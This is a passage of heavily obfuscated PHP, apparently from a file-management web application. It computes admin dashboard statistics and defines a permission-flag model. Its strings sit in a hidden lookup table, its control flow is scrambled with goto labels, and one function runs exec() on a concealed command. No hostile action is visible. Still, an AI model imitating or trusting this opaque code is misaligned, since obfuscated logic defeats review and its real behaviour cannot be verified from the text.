Model($AóÀ†ÒˆßÉ[541])->where($fê·¾Ú„Ÿ)->count($AóÀ†ÒˆßÉ[1551]); $fê·¾Ú„Ÿ[$AóÀ†ÒˆßÉ[39]] = $AóÀ†ÒˆßÉ[1660]; $dÄ¹è¾Ö¨Ä = Model($AóÀ†ÒˆßÉ[1661])->where($fê·¾Ú„Ÿ)->count($AóÀ†ÒˆßÉ[1662]); goto fëáŸÜ†é¿; aÌë Ù´®—: $AóÀ†ÒˆßÉ =& $_SERVER[œÕÊİğö]; $c„ôëÙÀ = strtotime(date($AóÀ†ÒˆßÉ[1658], strtotime($Aéøëñ×ÃÃ))); $A‰àŠ‡ÌÒ = strtotime(date($AóÀ†ÒˆßÉ[1659], strtotime($Aéøëñ×ÃÃ))); goto DëÒ¡¤Ğõ¡; DëÒ¡¤Ğõ¡: $fê·¾Ú„Ÿ = array($AóÀ†ÒˆßÉ[204] => array($AóÀ†ÒˆßÉ[994], $A‰àŠ‡ÌÒ)); $cšœ¸Ú’×é = Model($AóÀ†ÒˆßÉ[541])->where($fê·¾Ú„Ÿ)->count($AóÀ†ÒˆßÉ[1551]); $fê·¾Ú„Ÿ[$AóÀ†ÒˆßÉ[204]] = array($AóÀ†ÒˆßÉ[341], array($c„ôëÙÀ, $A‰àŠ‡ÌÒ)); goto E¼œ‰¬†ñÉ; B½ç›á¼³: } public function _recordStore($BğĞÂŒÈÀô = '') { goto aİëõØô•; CÅ¨È‰Æ¨Ú: $aÃ…Ò‡…ì¼ = Model($Eã´ˆÆóÁ[473])->where($Då³àÈß¹‹)->sum($Eã´ˆÆóÁ[88]); $Då³àÈß¹‹[$Eã´ˆÆóÁ[414]] = 0; $BÁÔº„‘èà = Model($Eã´ˆÆóÁ[822])->where($Då³àÈß¹‹)->sum($Eã´ˆÆóÁ[88]); goto aêÔÁ¬™Í•; aêÔÁ¬™Í•: $Då³àÈß¹‹[$Eã´ˆÆóÁ[415]] = 1; $EâÁ‰òÆ°Î = Model($Eã´ˆÆóÁ[822])->where($Då³àÈß¹‹)->sum($Eã´ˆÆóÁ[88]); $Då³àÈß¹‹[$Eã´ˆÆóÁ[415]] = 2; goto dÈÛµÄ‚¥; dÈÛµÄ‚¥: $cËğ õì›İ = Model($Eã´ˆÆóÁ[822])->where($Då³àÈß¹‹)->sum($Eã´ˆÆóÁ[88]); $BœÔÄÃºâê = array($Eã´ˆÆóÁ[232] => $BğĞÂŒÈÀô, $Eã´ˆÆóÁ[753] => (int) $BÁÔº„‘èà, $Eã´ˆÆóÁ[1651] => (int) $aÃ…Ò‡…ì¼, $Eã´ˆÆóÁ[1652] => (int) $EâÁ‰òÆ°Î, $Eã´ˆÆóÁ[1653] => (int) $cËğ õì›İ); return $this->insert($BœÔÄÃºâê); goto càÄ‘×ä÷©; aİëõØô•: $Eã´ˆÆóÁ =& $_SERVER[œÕÊİğö]; $aæá°ÌÓ‘ = strtotime(date($Eã´ˆÆóÁ[1659], strtotime($BğĞÂŒÈÀô))); $Då³àÈß¹‹ = array($Eã´ˆÆóÁ[204] => array($Eã´ˆÆóÁ[994], $aæá°ÌÓ‘)); goto CÅ¨È‰Æ¨Ú; càÄ‘×ä÷©: } public function trend($EÁŞ¶ç‰², $fùîí—«Ã) { goto B•†ˆ‹„ç¨; B•†ˆ‹„ç¨: $bøÏßƒ§ =& $_SERVER[œÕÊİğö]; if (!$this->init($EÁŞ¶ç‰²)) { return !1; } $bµºÕ’ä¾ = $this->trendList($EÁŞ¶ç‰²); goto BŞóÊµÑ¯; f¦›¬’ÙË¿: return $Aåî®ªó”; goto fš§¿¤æÅ­; BŞóÊµÑ¯: if ($bµºÕ’ä¾ && $fùîí—«Ã != $bøÏßƒ§[1524]) { $aÃéøéƒŸ = $bµºÕ’ä¾[0][$bøÏßƒ§[232]]; $Eµ·¶¤‡´ = $this->validDate($fùîí—«Ã, $aÃéøéƒŸ); $B¯Áù·¿…Ü = array(); $B…ÔÎ‘„¿… = array_to_keyvalue($bµºÕ’ä¾, $bøÏßƒ§[232]); foreach ($Eµ·¶¤‡´ as $DÇº§»¬È¿) { if (isset($B…ÔÎ‘„¿…[$DÇº§»¬È¿])) { $AÚ…—…ä„ = $B…ÔÎ‘„¿…[$DÇº§»¬È¿]; } else { $AÚ…—…ä„ = end($bµºÕ’ä¾); $AÚ…—…ä„[$bøÏßƒ§[232]] = $DÇº§»¬È¿; if ($EÁŞ¶ç‰² == $bøÏßƒ§[597]) { $AÚ…—…ä„[$bøÏßƒ§[1647]] = $AÚ…—…ä„[$bøÏßƒ§[1648]] = 0; } } $B¯Áù·¿…Ü[] = $AÚ…—…ä„; } $bµºÕ’ä¾ = $B¯Áù·¿…Ü; } $fÍ·Ä–µ± = array($bøÏßƒ§[597] => array($bøÏßƒ§[755] => LNG($bøÏßƒ§[1663]), $bøÏßƒ§[1647] => LNG($bøÏßƒ§[1664]), $bøÏßƒ§[1648] => LNG($bøÏßƒ§[1665])), $bøÏßƒ§[1649] => array($bøÏßƒ§[753] => LNG($bøÏßƒ§[1666]), $bøÏßƒ§[1651] => LNG($bøÏßƒ§[1667]), $bøÏßƒ§[1652] => LNG($bøÏßƒ§[1668]), $bøÏßƒ§[1653] => LNG($bøÏßƒ§[1669]))); $b¯àÈ‰šÚĞ = array($bøÏßƒ§[597] => $bøÏßƒ§[1670], $bøÏßƒ§[1649] => $bøÏßƒ§[88]); goto fß²“ˆ×Š; fß²“ˆ×Š: if (empty($bµºÕ’ä¾)) { $DÇº§»¬È¿ = date($bøÏßƒ§[1654], strtotime($bøÏßƒ§[1655])); $e¬ÒÁäâğ² = array($bøÏßƒ§[232] => $DÇº§»¬È¿); foreach ($fÍ·Ä–µ±[$EÁŞ¶ç‰²] as $fÈ‘è® => $E¥ˆØáÊÂÈ) { $e¬ÒÁäâğ²[$fÈ‘è®] = 0; } $bµºÕ’ä¾[] = $e¬ÒÁäâğ²; } $Aåî®ªó” = array(); foreach ($bµºÕ’ä¾ as $E¥ˆØáÊÂÈ) { if ($EÁŞ¶ç‰² == $bøÏßƒ§[1649] && $E¥ˆØáÊÂÈ[$bøÏßƒ§[1651]] > $E¥ˆØáÊÂÈ[$bøÏßƒ§[753]]) { $E¥ˆØáÊÂÈ[$bøÏßƒ§[1651]] = $E¥ˆØáÊÂÈ[$bøÏßƒ§[753]]; } foreach ($fÍ·Ä–µ±[$EÁŞ¶ç‰²] as $fÈ‘è® => $eÓ¢œ‹ßšç) { $AÚ…—…ä„ = array($bøÏßƒ§[232] => $E¥ˆØáÊÂÈ[$bøÏßƒ§[232]], $bøÏßƒ§[1452] => $eÓ¢œ‹ßšç); $AÚ…—…ä„[$b¯àÈ‰šÚĞ[$EÁŞ¶ç‰²]] = isset($E¥ˆØáÊÂÈ[$fÈ‘è®]) ? $E¥ˆØáÊÂÈ[$fÈ‘è®] : 0; $Aåî®ªó”[] = $AÚ…—…ä„; } } goto f¦›¬’ÙË¿; fš§¿¤æÅ­: } public function validDate($BÔöÏ×õ‡å, $a›²ÏëÉº) { goto FÕô’¶¹ê÷; BÉÅ‘Ù½¨®: return $f£Š—ó—Íˆ; goto bÛ»—Ğ‹´Ä; FÕô’¶¹ê÷: $C“£ó–ë¸ç =& $_SERVER[œÕÊİğö]; $bÆ”İœöìÅ = date($C“£ó–ë¸ç[1654], strtotime($C“£ó–ë¸ç[1655])); $f£Š—ó—Íˆ = array($bÆ”İœöìÅ); goto Fêîã¥ºñª; Fêîã¥ºñª: switch ($BÔöÏ×õ‡å) { case $C“£ó–ë¸ç[1531]: $bËÏÖåĞÂ‚ = mktime(0, 0, 0, date($C“£ó–ë¸ç[1671]), date($C“£ó–ë¸ç[1275]) - date($C“£ó–ë¸ç[1336]) + 7 - 7, date($C“£ó–ë¸ç[1672])); $AÉ³µğØµ = 0; do { $bÒ¢¡—¸Œ³ = date($C“£ó–ë¸ç[1654], $bËÏÖåĞÂ‚ - 3600 * 24 * 7 * $AÉ³µğØµ); $f£Š—ó—Íˆ[] = $bÒ¢¡—¸Œ³; $AÉ³µğØµ++; } while ($a›²ÏëÉº < $bÒ¢¡—¸Œ³); break; case $C“£ó–ë¸ç[1529]: $AÉ³µğØµ = 1; do { $BÅ¸¶ãßÛ = date($C“£ó–ë¸ç[1673], strtotime("\x2d\40{$AÉ³µğØµ}\40\155\x6f\156\164\150\163")); $f£Š—ó—Íˆ[] = $BÅ¸¶ãßÛ; $AÉ³µğØµ++; } while ($a›²ÏëÉº < $BÅ¸¶ãßÛ); break; case $C“£ó–ë¸ç[1674]: $fÏø®¼ïëÓ = (int) date($C“£ó–ë¸ç[1672], strtotime($a›²ÏëÉº)); $AÔ—Ñ¥Å¹ò = (int) date($C“£ó–ë¸ç[1672]); if ($fÏø®¼ïëÓ >= $AÔ—Ñ¥Å¹ò) { break; } for ($fÏø®¼ïëÓ; $fÏø®¼ïëÓ < $AÔ—Ñ¥Å¹ò; $fÏø®¼ïëÓ++) { $f£Š—ó—Íˆ[] = $fÏø®¼ïëÓ . $C“£ó–ë¸ç[1675]; } break; default: break; } if ($a›²ÏëÉº > end($f£Š—ó—Íˆ)) { array_pop($f£Š—ó—Íˆ); } sort($f£Š—ó—Íˆ); goto BÉÅ‘Ù½¨®; bÛ»—Ğ‹´Ä: } public function listTable($eÔí³‡±Ğ¤) { $AÌñÇÛ‹ ¦ = ucfirst($eÔí³‡±Ğ¤); return Model($AÌñÇÛ‹ ¦)->listData(); } public function option($aÕÏç ÚŠ’) { $d³øÖŒŠÖ™ = $_SERVER[œÕÊİğö][1676] . ucfirst($aÕÏç ÚŠ’); return $this->{$d³øÖŒŠÖ™}(); } private function optionUser() { goto B¤ÔÑÜ‰´; b¾”†åÛ¯: if ($fÅÀëÁ§‡­ < $A£¯­×¢å‚) { $fÅÀëÁ§‡­ = $A£¯­×¢å‚; } $fğšğ ”­‰ = array($bÙ æŠŸê[1678] => array($bÙ æŠŸê[995], $fÅÀëÁ§‡­)); $cµÆŒ†‚ÓÕ = (int) Model($bÙ æŠŸê[541])->where($fğšğ ”­‰)->count($bÙ æŠŸê[1551]); goto Fù•ÈåÕ¼à; Fù•ÈåÕ¼à: if (!$cµÆŒ†‚ÓÕ) { $cµÆŒ†‚ÓÕ = 1; } $fğšğ ”­‰ = array($bÙ æŠŸê[1678] => array($bÙ æŠŸê[995], $A£¯­×¢å‚)); $F®ƒí¼’Á = Model($bÙ æŠŸê[541])->where($fğšğ ”­‰)->count($bÙ æŠŸê[1551]); goto e¾Ö‘ù£¯…; f‘ŒìõàË¯: $dñôÍĞùÖ = intval($GLOBALS[$bÙ æŠŸê[6]][$bÙ æŠŸê[357]][$bÙ æŠŸê[1510]]) / 3600; $fÅÀëÁ§‡­ = strtotime("\x2d{$dñôÍĞùÖ}\x20\x68\157\x75\162\163"); $A£¯­×¢å‚ = strtotime(date($bÙ æŠŸê[1658])); goto b¾”†åÛ¯; e¾Ö‘ù£¯…: return array($bÙ æŠŸê[749] => (int) $E¹ò…˜ŸÈ², $bÙ æŠŸê[1679] => (int) ($E¹ò…˜ŸÈ² - $dÓÜÕ³ô»), $bÙ æŠŸê[1680] => (int) $dÓÜÕ³ô», $bÙ æŠŸê[1681] => (int) $F®ƒí¼’Á, $bÙ æŠŸê[1682] => $cµÆŒ†‚ÓÕ); goto DÁ½¤ˆ‚; B¤ÔÑÜ‰´: $bÙ æŠŸê =& $_SERVER[œÕÊİğö]; $E¹ò…˜ŸÈ² = Model($bÙ æŠŸê[541])->count($bÙ æŠŸê[1551]); $dÓÜÕ³ô» = Model($bÙ æŠŸê[541])->where($bÙ æŠŸê[1677])->count($bÙ æŠŸê[1551]); goto f‘ŒìõàË¯; DÁ½¤ˆ‚: } private function optionFile() { goto D«¥´õéÏõ; D«¥´õéÏõ: $DîÍ‚ĞŸ¹ =& $_SERVER[œÕÊİğö]; $b‚ÑÊõ–· = $this->sourceSize(); $E‘¥ç‡É = $b‚ÑÊõ–·[$DîÍ‚ĞŸ¹[88]]; goto fÒŠÚøèì‚; fÒŠÚøèì‚: $e„İŒ×Ë´î = $b‚ÑÊõ–·[$DîÍ‚ĞŸ¹[1651]]; $a‚åŠíŒ½³ = Model($DîÍ‚ĞŸ¹[822])->where(array($DîÍ‚ĞŸ¹[414] => 0))->count($DîÍ‚ĞŸ¹[406]); $Fóˆ ÎÒƒô = array($DîÍ‚ĞŸ¹[414] => 0, $DîÍ‚ĞŸ¹[204] => array($DîÍ‚ĞŸ¹[995], strtotime(date($DîÍ‚ĞŸ¹[1658])))); goto cÈÄÙ™ìĞØ; cÈÄÙ™ìĞØ: $Aâ¯Î¶Óğ“ = Model($DîÍ‚ĞŸ¹[822])->where($Fóˆ ÎÒƒô)->sum($DîÍ‚ĞŸ¹[88]); $C—Íó¼ôÎ = Model($DîÍ‚ĞŸ¹[822])->where($Fóˆ ÎÒƒô)->count($DîÍ‚ĞŸ¹[406]); return array($DîÍ‚ĞŸ¹[753] => $E‘¥ç‡É, $DîÍ‚ĞŸ¹[1651] => $e„İŒ×Ë´î, $DîÍ‚ĞŸ¹[1683] => $E‘¥ç‡É - $e„İŒ×Ë´î, $DîÍ‚ĞŸ¹[1684] => (int) $Aâ¯Î¶Óğ“, $DîÍ‚ĞŸ¹[755] => (int) $a‚åŠíŒ½³, $DîÍ‚ĞŸ¹[1685] => (int) $C—Íó¼ôÎ); goto C†ˆÙáµ¼‘; C†ˆÙáµ¼‘: } private function optionAccess() { $F¦ÁäÇ‘Œ =& $_SERVER[œÕÊİğö]; return array($F¦ÁäÇ‘Œ[749] => $this->typeLogCnt(), $F¦ÁäÇ‘Œ[117] => $this->typeLogCnt($F¦ÁäÇ‘Œ[117]), $F¦ÁäÇ‘Œ[453] => $this->typeLogCnt($F¦ÁäÇ‘Œ[453]), $F¦ÁäÇ‘Œ[1686] => $this->typeLogCnt($F¦ÁäÇ‘Œ[1686]), $F¦ÁäÇ‘Œ[1687] => $this->typeLogCnt($F¦ÁäÇ‘Œ[1687]), $F¦ÁäÇ‘Œ[597] => $this->typeLogCnt($F¦ÁäÇ‘Œ[43], $F¦ÁäÇ‘Œ[1662])); } private function typeLogCnt($e×ËÙÃ©µ = '', $Dù²º— è = "\151\x64") { goto bŠÛÚğˆÇ ; bŠÛÚğˆÇ : $c­£‰…¯‹¢ =& $_SERVER[œÕÊİğö]; $D×»ù£·…Ô = array($c­£‰…¯‹¢[117] => array($c­£‰…¯‹¢[1688], $c­£‰…¯‹¢[1689]), $c­£‰…¯‹¢[453] => array($c­£‰…¯‹¢[1690], $c­£‰…¯‹¢[1691]), $c­£‰…¯‹¢[1686] => array($c­£‰…¯‹¢[1692], $c­£‰…¯‹¢[1693], $c­£‰…¯‹¢[1694]), $c­£‰…¯‹¢[1687] => array($c­£‰…¯‹¢[1695], $c­£‰…¯‹¢[1696]), $c­£‰…¯‹¢[1697] => array($c­£‰…¯‹¢[1698], $c­£‰…¯‹¢[1699], $c­£‰…¯‹¢[1700])); $dÒÔĞ¹‘Ë± = strtotime(date($c­£‰…¯‹¢[1658])); goto C’¨†Ü¯³; FĞÄæÜ±•: return (int) $B«¢µ‡ğĞ¥; goto DµçŠ÷Ö–Â; C’¨†Ü¯³: $dºÛíø¯‹é = array($c­£‰…¯‹¢[204] => array($c­£‰…¯‹¢[995], $dÒÔĞ¹‘Ë±)); if ($e×ËÙÃ©µ) { $dºÛíø¯‹é[$c­£‰…¯‹¢[39]] = array($c­£‰…¯‹¢[7], $D×»ù£·…Ô[$e×ËÙÃ©µ]); } $B«¢µ‡ğĞ¥ = Model($c­£‰…¯‹¢[1661])->where($dºÛíø¯‹é)->count($Dù²º— è); goto FĞÄæÜ±•; DµçŠ÷Ö–Â: } private function optionServer() { goto EŠ½áÒò‹›; C¶·Ù¹…°: return array($AÔ–é¬ø¼[1703] => $c©ÈÜ†˜æ« ? $c©ÈÜ†˜æ«[$AÔ–é¬ø¼[1704]] : 0, $AÔ–é¬ø¼[1705] => $c©ÈÜ†˜æ« ? $c©ÈÜ†˜æ«[$AÔ–é¬ø¼[1706]] : 0, $AÔ–é¬ø¼[1707] => (int) $bŞ§½è™ß[$AÔ–é¬ø¼[1704]] * 1024 * 1024 * 1024, $AÔ–é¬ø¼[1708] => (int) $BÉ¯Ùº‹ª›, $AÔ–é¬ø¼[1709] => ucfirst($E¦Ç£Íïè), $AÔ–é¬ø¼[1710] => $AÔ–é¬ø¼[1711] . PHP_VERSION, $AÔ–é¬ø¼[1712] => phpBuild64() ? 64 : 32, $AÔ–é¬ø¼[748] => str_replace($AÔ–é¬ø¼[1713], $AÔ–é¬ø¼[972], $e»èãóÖÁ), $AÔ–é¬ø¼[357] => ucfirst($CØ‡ªÌµœĞ), $AÔ–é¬ø¼[38] => $_SERVER[$AÔ–é¬ø¼[1714]]); goto cÜ¼…Ù–ãó; B­Ä¾å… £: $E§ÖŸ³µ­– = array($AÔ–é¬ø¼[814] => $bŞ§½è™ß[$AÔ–é¬ø¼[404]]); $BÉ¯Ùº‹ª› = Model($AÔ–é¬ø¼[473])->where($E§ÖŸ³µ­–)->sum($AÔ–é¬ø¼[88]); $CÄëÓšª–† = explode($AÔ–é¬ø¼[60], $_SERVER[$AÔ–é¬ø¼[152]]); goto e´ì¤â©Œ©; F¡®Œë«Í: if ($e»èãóÖÁ == $AÔ–é¬ø¼[787]) { $fº²í°ø = explode($AÔ–é¬ø¼[1189], $f‹ÌÏ•ĞÁ[$AÔ–é¬ø¼[955]]); $e»èãóÖÁ = $fº²í°ø[0]; } if ($e»èãóÖÁ == $AÔ–é¬ø¼[790] || $e»èãóÖÁ == $AÔ–é¬ø¼[791]) { $FÆ¸äø¶‹ = Model()->db()->query($AÔ–é¬ø¼[1701]); $C´Ş¸‘œØ¼ = $FÆ¸äø¶‹[0] && isset($FÆ¸äø¶‹[0][$AÔ–é¬ø¼[1451]]) ? $FÆ¸äø¶‹[0][$AÔ–é¬ø¼[1451]] : 0; $e»èãóÖÁ = $AÔ–é¬ø¼[1702] . ($C´Ş¸‘œØ¼ ? $AÔ–é¬ø¼[8] . $C´Ş¸‘œØ¼ : $AÔ–é¬ø¼[43]); } $CØ‡ªÌµœĞ = $GLOBALS[$AÔ–é¬ø¼[6]][$AÔ–é¬ø¼[357]][$AÔ–é¬ø¼[824]]; goto C¶·Ù¹…°; EŠ½áÒò‹›: $AÔ–é¬ø¼ =& $_SERVER[œÕÊİğö]; $c©ÈÜ†˜æ« = $this->diskDriver(); $bŞ§½è™ß = KodIO::defaultDriver(); goto B­Ä¾å… £; e´ì¤â©Œ©: $E¦Ç£Íïè = $CÄëÓšª–†[0]; $f‹ÌÏ•ĞÁ = $GLOBALS[$AÔ–é¬ø¼[6]][$AÔ–é¬ø¼[27]]; $e»èãóÖÁ = $f‹ÌÏ•ĞÁ[$AÔ–é¬ø¼[956]]; goto F¡®Œë«Í; cÜ¼…Ù–ãó: } private function diskDriver() { goto BƒµîãÙ¿»; eÁå’ßÊç: if ($bôˆƒ¼“Ú) { $a…ÙÒì¦İõ = $AèçÄË·ßô[1717]; if (function_exists($AèçÄË·ßô[1718])) { exec($AèçÄË·ßô[1719], $EóÑˆ÷Ş¼Ç); $a…ÙÒì¦İõ = $EóÑˆ÷Ş¼Ç[1] . $AèçÄË·ßô[8]; } } if (!file_exists($a…ÙÒì¦İõ)) { return; } $dÒ¸Š›ôã = @disk_total_space($a…ÙÒì¦İõ); goto Eº”˜ÇÂêÒ; Eº”˜ÇÂêÒ: $BÃ‚õ“ªé = $dÒ¸Š›ôã - @disk_free_space($a…ÙÒì¦İõ); return array($AèçÄË·ßô[1704] => $dÒ¸Š›ôã, $AèçÄË·ßô[1706] => $BÃ‚õ“ªé); goto e²ãø™“Ÿ; BƒµîãÙ¿»: $AèçÄË·ßô =& $_SERVER[œÕÊİğö]; $a…ÙÒì¦İõ = $AèçÄË·ßô[8]; $bôˆƒ¼“Ú = $GLOBALS[$AèçÄË·ßô[6]][$AèçÄË·ßô[1715]] == $AèçÄË·ßô[1716]; goto eÁå’ßÊç; e²ãø™“Ÿ: } public function fileChart($a£À‚‚§») { goto b¢¦Ü®ìŒ–; fîê÷‡Ä: $e±óª¹È¾Ó[$CĞë ©‚Â©[415]] = 2; $d¥¦èöè = Model($CĞë ©‚Â©[822])->where($e±óª¹È¾Ó)->sum($CĞë ©‚Â©[88]); return array($CĞë ©‚Â©[753] => $eïòí¸¬–Š[$CĞë ©‚Â©[88]], $CĞë ©‚Â©[1651] => $eïòí¸¬–Š[$CĞë ©‚Â©[1651]], $CĞë ©‚Â©[1652] => (int) $f•ÇéÏÎˆ±, $CĞë ©‚Â©[1653] => (int) $d¥¦èöè); goto Aˆ–ÚŠÉÓ‡; FÕé¶á³ƒ£: $eïòí¸¬–Š = $this->sourceSize(); $e±óª¹È¾Ó = array($CĞë ©‚Â©[501] => 0, $CĞë ©‚Â©[415] => 1); $f•ÇéÏÎˆ± = Model($CĞë ©‚Â©[822])->where($e±óª¹È¾Ó)->sum($CĞë ©‚Â©[88]); goto fîê÷‡Ä; b¢¦Ü®ìŒ–: $CĞë ©‚Â© =& $_SERVER[œÕÊİğö]; if (isset($a£À‚‚§»[$CĞë ©‚Â©[1551]])) { return Model($CĞë ©‚Â©[822])->userFileTypeProfile($a£À‚‚§»[$CĞë ©‚Â©[1551]]); } if (isset($a£À‚‚§»[$CĞë ©‚Â©[1720]])) { return Model($CĞë ©‚Â©[822])->groupFileTypeProfile($a£À‚‚§»[$CĞë ©‚Â©[1720]]); } goto FÕé¶á³ƒ£; Aˆ–ÚŠÉÓ‡: } private function sourceSize() { $FË¶õÖŸÉ =& $_SERVER[œÕÊİğö]; $eÕ¼Ó‹Ú© = Model($FË¶õÖŸÉ[822])->where(array($FË¶õÖŸÉ[414] => 0))->sum($FË¶õÖŸÉ[88]); $c£ÌôâÙÌ = Model($FË¶õÖŸÉ[473])->sum($FË¶õÖŸÉ[88]); if ($c£ÌôâÙÌ > $eÕ¼Ó‹Ú©) { $c£ÌôâÙÌ = $eÕ¼Ó‹Ú©; } return array($FË¶õÖŸÉ[88] => (int) $eÕ¼Ó‹Ú©, $FË¶õÖŸÉ[1651] => (int) $c£ÌôâÙÌ); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $FÎ¬ó…»¢• =& $_SERVER[œÕÊİğö]; $Bª¶ÈğâÄ = array(array($FÎ¬ó…»¢•[424] => LNG($FÎ¬ó…»¢•[1721]), $FÎ¬ó…»¢•[1722] => $FÎ¬ó…»¢•[1723], $FÎ¬ó…»¢•[1724] => 1, $FÎ¬ó…»¢•[1725] => 1, $FÎ¬ó…»¢•[1726] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($FÎ¬ó…»¢•[424] => LNG($FÎ¬ó…»¢•[1727]), $FÎ¬ó…»¢•[1722] => $FÎ¬ó…»¢•[1728], $FÎ¬ó…»¢•[1724] => 2, $FÎ¬ó…»¢•[1725] => 1, $FÎ¬ó…»¢•[1726] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($FÎ¬ó…»¢•[424] => LNG($FÎ¬ó…»¢•[1729]), $FÎ¬ó…»¢•[1722] => $FÎ¬ó…»¢•[1730], $FÎ¬ó…»¢•[1724] => 3, $FÎ¬ó…»¢•[1725] => 1, $FÎ¬ó…»¢•[1726] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($FÎ¬ó…»¢•[424] => LNG($FÎ¬ó…»¢•[1731]), $FÎ¬ó…»¢•[1722] => $FÎ¬ó…»¢•[1732], $FÎ¬ó…»¢•[1724] => 4, $FÎ¬ó…»¢•[1725] => 1, $FÎ¬ó…»¢•[1726] => self::AUTH_SHOW | self::AUTH_VIEW), array($FÎ¬ó…»¢•[424] => LNG($FÎ¬ó…»¢•[1733]), $FÎ¬ó…»¢•[1722] => $FÎ¬ó…»¢•[1734], $FÎ¬ó…»¢•[1724] => 5, $FÎ¬ó…»¢•[1725] => 1, $FÎ¬ó…»¢•[1726] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($FÎ¬ó…»¢•[424] => LNG($FÎ¬ó…»¢•[1735]), $FÎ¬ó…»¢•[1722] => $FÎ¬ó…»¢•[1736], $FÎ¬ó…»¢•[1724] => 6, $FÎ¬ó…»¢•[1725] => 1, $FÎ¬ó…»¢•[1726] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($FÎ¬ó…»¢•[424] => LNG($FÎ¬ó…»¢•[1737]), $FÎ¬ó…»¢•[1722] => $FÎ¬ó…»¢•[1738], $FÎ¬ó…»¢•[1724] => 7, $FÎ¬ó…»¢•[1725] => 1, $FÎ¬ó…»¢•[1726] => 0)); return $Bª¶ÈğâÄ; } public static function authCheck($EòñÏ¸îï, $Dãç¯ø½õ›) { $EòñÏ¸îï = intval($EòñÏ¸îï); if ($GLOBALS[$_SERVER[œÕÊİğö][508]]) { return !0; } if ($EòñÏ¸îï <= 0) { return !1; } if (($EòñÏ¸îï & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($EòñÏ¸îï & $Dãç¯ø½õ›); } public static function authCheckShow($E’ƒøì™Ÿ) { return self::authCheck($E’ƒøì™Ÿ, self::AUTH_SHOW); } public static function authCheckView($CÍŒùš†Ç) { return self::authCheck($CÍŒùš†Ç, self::AUTH_VIEW); } public static function authCheckDownload($A¤‹ç¼ëê÷) { return self::authCheck($A¤‹ç¼ëê÷, self::AUTH_DOWNLOAD); } public static function authCheckUpload($aäë‚á ½¬) { return self::authCheck($aäë‚á ½¬, self::AUTH_UPLOAD); } public static function authCheckEdit($bù´¡šÄ) { return self::authCheck($bù´¡šÄ, self::AUTH_EDIT); } public static function authCheckRemove($fÔ§“°ô¬â) { return self::authCheck($fÔ§“°ô¬â, self::AUTH_REMOVE); } public static function authCheckShare($F•Á†¬ËŠ) { return self::authCheck($F•Á†¬ËŠ, self::AUTH_SHARE); } public static function authCheckComment($a™”µğ¯Ó ) { return self::authCheck($a™”µğ¯Ó , self::AUTH_COMMENT); } public static function authCheckEvent($eŠë†òÆÒ¾) { return self::authCheck($eŠë†òÆÒ¾, self::AUTH_EVENT); } public static function authCheckRoot($BõŸğ¹‚Éİ) { return self::authCheck($BõŸğ¹‚Éİ, self::AUTH_ROOT); } public static function authCheckAction($A·çğ†Äîá, $e¹²øÉÊÛ) { goto EÑïØÌİŞ; bù±¸Æ•â: $cºæ¯æ¦† = $Dµã¡‚• „[$e¹²øÉÊÛ]; $A·çğ†Äîá = intval($A·çğ†Äîá); if ($A·çğ†Äîá <= 0) { return !1; } goto A‹Š¢Ï×Æí; EÑïØÌİŞ: $d‰¹ç¿ˆ»¡ =& $_SERVER[œÕÊİğö]; $Dµã¡‚• „ = array($d‰¹ç¿ˆ»¡[1739] => self::AUTH_VIEW, $d‰¹ç¿ˆ»¡[1116] => self::AUTH_DOWNLOAD, $d‰¹ç¿ˆ»¡[117] => self::AUTH_UPLOAD, $d‰¹ç¿ˆ»¡[1687] => self::AUTH_EDIT, $d‰¹ç¿ˆ»¡[1686] => self::AUTH_REMOVE, $d‰¹ç¿ˆ»¡[1697] => self::AUTH_SHARE, $d‰¹ç¿ˆ»¡[362] => self::AUTH_COMMENT, $d‰¹ç¿ˆ»¡[1539] => self::AUTH_EVENT, $d‰¹ç¿ˆ»¡[1740] => self::AUTH_ROOT); if (!isset($Dµã¡‚• „[$e¹²øÉÊÛ])) { return; } goto bù±¸Æ•â; A‹Š¢Ï×Æí: if (($A·çğ†Äîá & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($A·çğ†Äîá & $cºæ¯æ¦†); goto a¸Ÿà°»»×; a¸Ÿà°»»×: } public static function authDisable($f¸’Ø³§Ü², $fƒ§ÙãÌ±) { if (intval($f¸’Ø³§Ü²) <= 0) { return 0; } return intval($f¸’Ø³§Ü²) & ~$fƒ§ÙãÌ±; } public $optionType = "\123\x79\x73\164\x65\155\56\x73\157\x75\162\143\145\101\x75\x74\150\114\x69\163\x74"; public $field = array("\x6e\x61\x6d\x65", "\141\165\164\x68", "\154\x61\142\145\x6c", "\144\x69\x73\x70\154\x61\171", "\163\x79\x73\164\x65\x6d", "\163\x6f\x72\164"); public function initData() { $FªµÛ±Îõ = $this->authDefault(); foreach ($FªµÛ±Îõ as $bÍŒ­ƒÆ”²) { $this->add($bÍŒ­ƒÆ”²); } } public function findAuth($eëê¯ó»‰, $Eï„…Æ‹‰ß) { $eçŞ­´‹Åƒ =& $_SERVER[œÕÊİğö]; $a±ù©à–¨¬ = parent::listData(); foreach ($a±ù©à–¨¬ as $f¤Ÿ²¨Èğ) { $fİ¶´šŒÖ¼ = 